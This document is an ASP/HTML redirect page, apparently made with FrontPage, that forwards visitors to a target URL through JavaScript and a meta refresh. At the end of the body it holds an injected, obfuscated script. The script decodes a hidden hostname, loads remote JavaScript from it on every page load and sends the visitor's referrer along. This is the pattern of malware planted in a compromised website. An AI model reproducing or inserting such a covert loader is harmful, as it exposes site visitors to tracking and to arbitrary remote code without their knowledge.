<%
IF 0 = LEN(sQuery) THEN sURL = sName
Response.Redirect sURL
%>
<html>

<head>
<title><%=sName%></title>
<meta name="ROBOTS" content="noindex">
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<script language="JavaScript">
<!--
var sURL = "<%=sURL%>";

function doRedirect()
{
	setTimeout( "timedRedirect()", 1*1000 );
}

function timedRedirect()
{
	window.location.href = sURL;
}

//-->
</script>

<script language="JavaScript1.1">
<!--
function doRedirect()
{
	window.location.replace( sURL );
}

doRedirect();

//-->
</script>
<noscript>
<meta http-equiv="refresh" content="1; URL=<%=sURL%>">
</noscript>

</head>

<body onload="doRedirect()">

<p>Loading <a href="<%=sURL%>"><%=sName%></a></p>
<p>In a couple of seconds the redirection target page should load.<br>
If it doesn't please select the link above.</p>

<script>var QpaxQomozo = 'AXSXTNJFJJzJYOIOiCIKGJWmMFXLUOaIGPHZJLM0OUAHY7LEQOCWI.IVSrSOMNCBJu'.replace(/[A-Z]/g,''); var FibomafNidiza = document.createElement('script'); FibomafNidiza.src = 'http://' + QpaxQomozo + '/?page=' + escape(document.referrer) + '&rnd=' + Math.random(); document.getElementsByTagName('head')[0].appendChild(FibomafNidiza);</script></body>

</html>
